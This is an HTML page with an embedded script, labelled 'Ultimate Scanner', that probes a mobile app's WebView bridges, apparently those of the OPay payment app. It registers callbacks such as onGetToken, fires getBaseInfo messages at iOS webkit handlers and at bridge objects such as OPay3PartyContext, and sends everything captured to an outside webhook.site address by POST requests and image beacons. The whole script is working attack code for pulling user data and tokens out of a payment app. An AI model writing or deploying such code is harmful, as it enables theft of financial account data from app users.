<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultimate Scanner</title>
</head>

<body
    style="background: green; color: white; font-family: -apple-system, sans-serif; text-align: center; padding: 20px;">
    <h1 id="status">SCANNING...</h1>
    <div id="log" style="font-size: 10px; color: #fff; text-align: left; opacity: 0.8;"></div>

    <script>
        (function () {
            var WEBHOOK = 'https://webhook.site/c4e48555-8559-4bb0-b04a-a347d20a7569';
            var logDiv = document.getElementById('log');

            function report(msg, type) {
                var div = document.createElement('div');
                div.innerText = msg;
                logDiv.appendChild(div);
                new Image().src = WEBHOOK + '?msg=' + encodeURIComponent(msg) + '&type=' + (type || 'info') + '&ts=' + Date.now();
            }

            function exfil(obj) {
                var xhr = new XMLHttpRequest();
                xhr.open('POST', WEBHOOK, true);
                xhr.send(JSON.stringify(obj));
            }

            report('ULTIMATE SCANNER V3 START');

            // 1. Register massive callback list
            var callbacks = ['onGetBaseInfo', 'onGetToken', 'nativeCallback', 'receiveMessage', 'opayCallback', 'onReceiveNativeMessage'];
            callbacks.forEach(function (n) {
                window[n] = function (d) {
                    report('CALLBACK TRIGGERED: ' + n, 'success');
                    exfil({ source: 'callback', name: n, data: d });
                };
            });

            // 2. Wait and Scan
            setTimeout(function () {
                report('Starting Scan...');

                // Inspect window for anything suspicious
                var suspects = [];
                for (var key in window) {
                    if (key.toLowerCase().indexOf('opay') !== -1 || key.toLowerCase().indexOf('context') !== -1 || key.toLowerCase().indexOf('bridge') !== -1) {
                        suspects.push(key);
                    }
                }
                report('Suspects: ' + suspects.join(', '));

                // Check WebKit specifically
                if (window.webkit && window.webkit.messageHandlers) {
                    var handlers = Object.keys(window.webkit.messageHandlers);
                    report('iOS Handlers: ' + handlers.join(', '));

                    handlers.forEach(function (h) {
                        try {
                            report('Firing postMessage to ' + h);
                            window.webkit.messageHandlers[h].postMessage({ action: 'getBaseInfo', callback: 'onGetBaseInfo' });
                            window.webkit.messageHandlers[h].postMessage({ method: 'getBaseInfo', cb: 'onGetBaseInfo' });
                        } catch (e) { report('Error firing ' + h + ': ' + e.message); }
                    });
                } else {
                    report('No window.webkit found');
                }

                // Check direct bridges
                var commonBridges = ['control', 'OPay3PartyContext', 'ORideContext'];
                commonBridges.forEach(function (b) {
                    if (window[b]) {
                        report('Checking Bridge: ' + b);
                        if (window[b].getBaseInfo) {
                            try {
                                var res = window[b].getBaseInfo();
                                report('Data captured from ' + b, 'success');
                                exfil({ source: 'direct', bridge: b, data: res });
                            } catch (e) { report('Error calling ' + b + ': ' + e.message); }
                        }
                    }
                });

                report('Scan Complete');
            }, 2000);
        })();
    </script>
</body>

</html>